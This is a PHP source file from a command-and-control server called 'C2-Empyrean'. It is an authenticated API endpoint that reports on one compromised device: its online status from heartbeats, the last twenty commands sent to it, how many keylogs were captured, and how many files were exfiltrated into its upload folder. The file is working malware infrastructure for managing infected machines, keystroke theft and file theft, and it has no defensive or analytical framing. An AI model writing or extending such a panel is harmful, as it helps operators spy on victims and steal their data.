<?php
/**
 * C2-Empyrean - API: Device Detail
 * GET /api/devices/detail?id=<device_id>
 */

$middleware->requireAuth();

$deviceId = $_GET['id'] ?? '';
if (!$deviceId) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Device ID required']);
    exit;
}

$devices = $db->read('devices');
$device = null;
foreach ($devices as $d) {
    if (($d['device_id'] ?? '') === $deviceId) {
        $device = $d;
        break;
    }
}

if (!$device) {
    http_response_code(404);
    echo json_encode(['success' => false, 'error' => 'Device not found']);
    exit;
}

// Calculate online status
$now = time();
$timeout = HEARTBEAT_INTERVAL * 3;
$device['is_online'] = (($device['last_seen'] ?? 0) + $timeout) > $now;

// Get recent commands for this device
$commands = $db->read('commands');
$deviceCommands = array_filter($commands, fn($c) => ($c['device_id'] ?? '') === $deviceId);
$deviceCommands = array_slice(array_values($deviceCommands), -20);

// Get recent keylogs count
$keylogs = $db->read('keylogs');
$keylogCount = count(array_filter($keylogs, fn($k) => ($k['device_id'] ?? '') === $deviceId));

// Get recent files count
// Files stored in uploads directory
$fileCount = 0;
$deviceUploadDir = UPLOAD_DIR . '/' . $deviceId;
if (is_dir($deviceUploadDir)) {
    $files = array_diff(scandir($deviceUploadDir), ['.', '..']);
    $fileCount = count($files);
}

echo json_encode([
    'success' => true,
    'data' => [
        'device' => $device,
        'stats' => [
            'commands_sent' => count($deviceCommands),
            'keylogs_captured' => $keylogCount,
            'files_exfiltrated' => $fileCount,
        ],
        'recent_commands' => array_values($deviceCommands),
    ],
]);
